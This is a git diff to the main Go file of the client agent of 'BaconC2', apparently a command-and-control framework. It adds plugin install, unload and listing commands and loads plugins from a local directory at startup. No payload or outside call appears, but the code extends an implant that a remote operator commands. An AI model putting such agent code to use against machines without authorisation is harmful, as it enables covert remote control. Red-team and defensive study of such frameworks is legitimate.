@@ -15,12 +15,14 @@ import (
 	"github.com/RabbITCybErSeC/BaconC2/client/config"
 	"github.com/RabbITCybErSeC/BaconC2/client/core/agent"
 	"github.com/RabbITCybErSeC/BaconC2/client/core/executor"
+	clientplugins "github.com/RabbITCybErSeC/BaconC2/client/core/plugins"
 	"github.com/RabbITCybErSeC/BaconC2/client/core/state"
 	"github.com/RabbITCybErSeC/BaconC2/client/core/transport"
 	command_handler "github.com/RabbITCybErSeC/BaconC2/pkg/commands/handlers"
 	"github.com/RabbITCybErSeC/BaconC2/pkg/commands/handlers/filesystem"
 	"github.com/RabbITCybErSeC/BaconC2/pkg/logging"
 	"github.com/RabbITCybErSeC/BaconC2/pkg/models"
+	"github.com/RabbITCybErSeC/BaconC2/pkg/plugins"
 	"github.com/RabbITCybErSeC/BaconC2/pkg/queue"
 	"github.com/RabbITCybErSeC/BaconC2/pkg/utils/encoders"
 	"github.com/google/uuid"
@@ -75,6 +77,39 @@ func main() {
 	commandRegistry.RegisterStatefulHandler(filesystem.NewPwdHandler())
 	commandRegistry.RegisterStatefulHandler(filesystem.NewLsHandler())
 
+	pluginDir := "./plugins"
+	pluginManager := plugins.NewPluginManager(pluginDir, commandRegistry, agentState)
+
+	// Register plugin management commands
+	pluginCommands := clientplugins.NewPluginCommands(pluginManager)
+	commandRegistry.RegisterHandler(command_handler.CommandHandler{
+		Name:    "plugin_install",
+		Handler: pluginCommands.HandlePluginInstall,
+	})
+	commandRegistry.RegisterHandler(command_handler.CommandHandler{
+		Name:    "plugin_unload",
+		Handler: pluginCommands.HandlePluginUnload,
+	})
+	commandRegistry.RegisterHandler(command_handler.CommandHandler{
+		Name:    "plugin_list",
+		Handler: pluginCommands.HandlePluginList,
+	})
+	commandRegistry.RegisterHandler(command_handler.CommandHandler{
+		Name:    "plugin_status",
+		Handler: pluginCommands.HandlePluginStatus,
+	})
+	commandRegistry.RegisterHandler(command_handler.CommandHandler{
+		Name:    "plugin_info",
+		Handler: pluginCommands.HandlePluginInfo,
+	})
+
+	// Scan and load any existing plugins in the plugin directory
+	if err := pluginManager.ScanAndLoadPlugins(); err != nil {
+		logging.Warn("Failed to scan plugins: %v", err)
+	}
+
+	logging.Info("Plugin system initialized (%d plugins loaded)", pluginManager.GetRegistry().Count())
+
 	commandExecutor := executor.NewDefaultCommandExecutor(cmdQueue, resultQueue, transportProtocol, wsTransport, cfg, commandRegistry, agentState)
 	client := agent.NewAgentClient(cfg, transportProtocol, commandExecutor, cmdQueue, resultQueue)
 
@@ -95,6 +130,13 @@ func main() {
 	sigChan := make(chan os.Signal, 1)
 	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
 	<-sigChan
+
+	logging.Info("Shutting down agent...")
+
+	// Shutdown plugin system
+	if err := pluginManager.Shutdown(); err != nil {
+		logging.Error("Error during plugin shutdown: %v", err)
+	}
 
 	client.Stop()
 	logging.Info("Agent client stopped")
